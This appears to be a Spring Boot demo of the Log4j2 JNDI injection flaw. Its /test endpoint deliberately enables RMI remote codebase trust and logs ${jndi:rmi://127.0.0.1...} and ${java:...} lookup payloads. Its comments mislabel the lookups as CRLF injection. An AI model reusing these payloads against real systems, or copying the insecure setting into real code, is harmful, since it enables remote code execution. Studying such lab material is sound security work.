package com.ppfly.log4j2jndirmiinjection;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.core.io.ClassPathResource;
import org.springframework.core.io.Resource;
import org.springframework.http.ContentDisposition;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RestController;

@RestController
@SpringBootApplication
public class Log4j2jndildapApplication {

    public static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) throws Exception {
        SpringApplication.run(Log4j2jndildapApplication.class, args);
    }

    @GetMapping("/test")
    public String test() {
        //在jdk>1.8.0_181 时除非用户自己开启了com.sun.jndi.rmi.object.trustURLCodebase配置，否则漏洞是无法通过rmi来实现的。
        // 但是这也并不是说jdk>1.8.0_181 就不用担心这个漏洞，因为还可以使用ldap
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        //正常打印信息
        String msg = "zhangsan";
        logger.info("正常打印信息：{}", msg);
        //CRLF 注入 打印信息
        msg = "${java:hw}";
        logger.info("打印系统硬件信息：{}", msg);
        //CRLF 注入 打印信息
        msg = "${java:os}";
        logger.info("打印操作系统信息：{}", msg);
        msg = "${jndi:rmi://127.0.0.1:1099/obj}";
        logger.info("jndi rmi注入：{}", msg);
        msg = "${jndi:rmi://127.0.0.1:1199/boom}";
        logger.info("boom，boom，boom：{}", msg);
        return "ok";
    }

    /**
     * 下载测试
     *
     * @param path
     * @return
     */
    @GetMapping("/{path}")
    public ResponseEntity<Resource> download(@PathVariable String path) {
        String contentDisposition = ContentDisposition
                .attachment() // .builder("attachment")
                .filename(path)
                .build().toString();
        return ResponseEntity.ok()
                .header(HttpHeaders.CONTENT_DISPOSITION, contentDisposition)
//                .contentType(MediaType.IMAGE_JPEG)
                .contentType(MediaType.MULTIPART_FORM_DATA)
//                .body(new FileSystemResource(path));
                .body(new ClassPathResource(path));
    }

}
